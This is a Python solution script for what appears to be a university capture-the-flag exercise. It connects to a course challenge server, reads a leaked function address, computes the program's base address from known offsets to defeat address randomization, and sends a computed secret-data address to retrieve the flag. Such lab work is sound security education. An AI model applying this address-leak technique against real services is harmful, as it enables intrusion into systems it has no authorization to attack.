import socket
import struct

def recv_until(s, delimiter):
    data = b""
    while not data.endswith(delimiter):
        data += s.recv(1)
    return data

def connect_and_solve():
    host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
    port = 1251

    # Connect to the server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    # Receive prompt for NetID
    netid_prompt = recv_until(s, b'Please input your NetID (something like abc123): ')
    print(netid_prompt.decode())

    # Send NetID
    s.sendall(b'sb9156\n')

    # Receive the post-it note message
    post_it_note = recv_until(s, b'FYI, this is the address of function `hint`:')
    print(post_it_note.decode())

    # Receive the fake vault address in raw bytes (6 bytes)
    fake_vault_address_raw = s.recv(8)

    # Pad the 6 bytes to 8 bytes (little-endian format)
    # print(fake_vault_address_raw.hex())
    fake_vault_padded_address = fake_vault_address_raw.ljust(8, b'\x00')
    # print(fake_vault_padded_address.hex())
    hint_offset = 0x12a9
    data_offset = 0x43f8                                     #fake vault offset obtained using greadelf command
    base_address = (struct.unpack("<Q", fake_vault_padded_address)[0]) - hint_offset
    add_address = base_address + data_offset
    #print(f'Base address (hex): {hex(base_address)}')

    # Add the secret vault offset
    
    # Convert the secret vault address to raw bytes (little-endian format)
    # secret_vault_address_bytes = struct.pack("<Q", add_address)
    secret_vault_address_bytes = str(add_address).encode()
    # print(struct.unpack("<Q", secret_vault_address_bytes))
    # print(int(add_address))
    # packed_data = struct.pack('!i', int(add_address))

    # Send the raw bytes of the secret vault address
    # print(hex(add_address))
    # print(secret_vault_address_bytes)

    s.sendall(secret_vault_address_bytes)
    # print(int(add_address))

    

    # Receive and print the response
    while True:
        response = s.recv(4096)
        if not response:
            break
        print(response.decode(), end='')

    # Close the connection
    s.close()

if __name__ == "__main__":
    connect_and_solve()
